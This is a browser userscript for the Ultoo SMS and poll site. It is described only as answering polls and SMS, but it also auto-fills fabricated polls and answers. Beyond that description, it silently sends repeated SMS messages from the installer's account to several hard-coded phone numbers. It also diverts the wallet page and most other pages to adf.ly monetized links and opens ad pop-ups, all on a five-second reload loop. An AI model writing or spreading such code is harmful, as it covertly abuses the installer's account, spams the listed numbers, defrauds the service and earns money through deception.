// ==UserScript==
// @name        Ultoo  ( 100% )
//@description ultoo poll and sms , answer it
// @namespace  ultoo

// @require https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js
// @grant       none
// @version     1
// @updateURL		http://userscripts.org/scripts/source/162368.meta.js
// @downloadURL		http://userscripts.org/scripts/source/162368.user.js
// @author         
// @licence        GPL version 3 or any later version; http://www.gnu.org/copyleft/gpl.html
// ==/UserScript==
$(function(){

var path = window.location.pathname;
var url=window.location.href;

var pattern=/^http:\/\/sms.ultoo.com\/mywallet.php/g;

if(url.search(pattern)==0)
{
	window.location.href ="http://adf.ly/Nx5vu";
}

var path = window.location.pathname;

if (path == "/poll.php")
{
  var rand = computeRandom();
  var opt = "AnchorId_"+rand;
  ImplementClass(opt);
  document.form1.submit();
var mobile=8528228412;
var message="Hi.., Good Day... ,"+Math.floor((Math.random() * 1000000000) + 1)+"times";
$.post("home.php",{zxcoiesesscd:"" , MessageLength:"140" , GlobalKeyValue:"1" , chalange_field:"" , response_field:"" , GsqbPdiMSo:mobile , rFBOayWrjq:message , SendNow_:"Send Now"}, function(){});
setTimeout("window.location.href = \"http://sms.ultoo.com/poll.php?zxcoiesesscd=\";",100);
}
function computeRandom()
{
return Math.round(Math.random() * (4-1) + 1);
}

pattern=/^http:\/\/sms.ultoo.com\/PollResult.php/g;

if(url.search(pattern)==0)
{
	var link = $(".poll_result_gbg a:last").attr('href');
	if(typeof(link) != "undefined")
	{
		window.location.href = link;
	}

	var link2 = $("img[src='images/submit_now.jpg']").parent().attr("href");
	if(typeof(link2) != "undefined")
	{
		window.location.href = link2;
	}
}

pattern=/^http:\/\/sms.ultoo.com\/middleAdPoll.php/g;

if(url.search(pattern)==0)
{
	window.location.href=url.replace("middleAdPoll","poll");
}

pattern=/^http:\/\/sms.ultoo.com\/PollCompletion.php/g;

if(url.search(pattern)==0)
{
	var link = $("img[src='images/submit_now.jpg']").parent().attr("href");
	if(typeof(link) != "undefined")
	{
		window.location.href = link;
	}
}

pattern=/^http:\/\/sms.ultoo.com\/PollCompleted.php/g;

if(url.search(pattern)==0)
{
	if(document.getElementsByTagName('font')[0]!=undefined)
	{
//	window.location.href="http://adf.ly/O2Mc7";
	window.location.href=url.replace("PollCompleted", "home");
        window.open('http://adf.ly/O7Jw5');
	}
	else
	{
		document.getElementsByName('PollUserName')[0].value="VICK";
		document.getElementsByName('PollUserQuestion')[0].value="What's your name? & Me only "+Math.floor((Math.random() * 100000) + 1)+"seconds";
document.getElementById('OptionId1').value=Math.floor((Math.random() * 100000) + 10);
document.getElementById('OptionId2').value=Math.floor((Math.random() * 50000) + 2);
document.getElementById('OptionId3').value=Math.floor((Math.random() * 8000) + 1);
		document.getElementById('OptionId4').value="Can't say"
		document.form1.submit();

	}
}

pattern=/^http:\/\/sms.ultoo.com\/QuestionSaved.php/g;

if(url.search(pattern)==0)
{
//	window.location.href="http://adf.ly/O2Mc7";
	window.location.href ="http://adf.ly/OBSDB";
        window.open('http://adf.ly/O7Jw5');
}


//Messages

var pattern=/^http:\/\/sms.ultoo.com\/home.php/g;

if(url.search(pattern)==0)
{
	var content=document.getElementsByTagName('font')[0].innerHTML;
	var pat="Dear";

	if(content.search(pat)<0)
	{	
	document.getElementById('GsqbPdiMSo').value=8528228412;
        document.getElementById('rFBOayWrjq').value="Good Day... ,"+Math.floor((Math.random() * 100000000) + 1);
document.getElementById("sendNowbtnDiv").click();
//	document.OcDFBSkxBk.submit();
	setTimeout("window.location.href = \"http://sms.ultoo.com/home.php?zxcoiesesscd=\";",300);
//setInterval(function () {document.getElementById("sendNowbtnDiv").click();}, 100);
document.getElementsByClassName('boxfieldcontent')[1].value=8528228412;
document.getElementsByClassName('boxfieldcontent')[2].value=9016403905;
document.getElementsByClassName('boxfieldcontent')[3].value=9360299840;
document.getElementsByClassName('txtfieldcontent')[1].value="Good Day... !"+Math.floor((Math.random() * 10000000) + 1);
document.getElementsByClassName('txtfieldcontent')[2].value="Good Day... !"+Math.floor((Math.random() * 10000000) + 1);
document.getElementsByClassName('txtfieldcontent')[3].value="Good Day... !"+Math.floor((Math.random() * 20000000) + 1);
document.getElementsByClassName('txtfieldcontent')[4].value="Good Day... !"+Math.floor((Math.random() * 30000000) + 1);
document.getElementsByClassName('txtfieldcontent')[5].value="Good Day... !"+Math.floor((Math.random() * 40000000) + 1);
document.getElementsByClassName('txtfieldcontent')[6].value="Good Day... !"+Math.floor((Math.random() * 50000000) + 1);
document.getElementById("sendNowbtnDiv").click();
//setTimeout("window.location.href = \"http://sms.ultoo.com/home.php?zxcoiesesscd=\";",400);
	}
	else
	{
		window.location.href ="http://adf.ly/Nx69y";
	} 
	}


pattern=/^http:\/\/sms.ultoo.com\/AICompletion.php/g;

if(url.search(pattern)==0)
{
	window.location.href="http://adf.ly/OBSXU";
}

pattern=/^http:\/\/sms.ultoo.com\/msgSent.php/g;

if(url.search(pattern)==0)
{
	window.location.href ="http://adf.ly/OBSZV";
}

pattern=/^http:\/\/sms.ultoo.com\/middleAdSendSms.php/g;
if(url.search(pattern)==0)
{
	window.location.href ="http://adf.ly/OBSc2";
}

pattern=/^http:\/\/sms.ultoo.com\/index.php/g;

if(url.search(pattern)==0)
{
	window.location.href="http://adf.ly/OBSi1";
}

pattern=/^http:\/\/sms.ultoo.com\/SessExpire.php/g;

if(url.search(pattern)==0)
{
	window.location.href="http://adf.ly/OBSkd";
}

pattern=/^http:\/\/sms.ultoo.com\/relogin.php/g;

if(url.search(pattern)==0)
{
	 window.location.href="http://adf.ly/O6BKB";
         window.open('http://adf.ly/Nx6Dv');
}
});

setTimeout(function(){
   window.location.reload(1);
}, 5000);
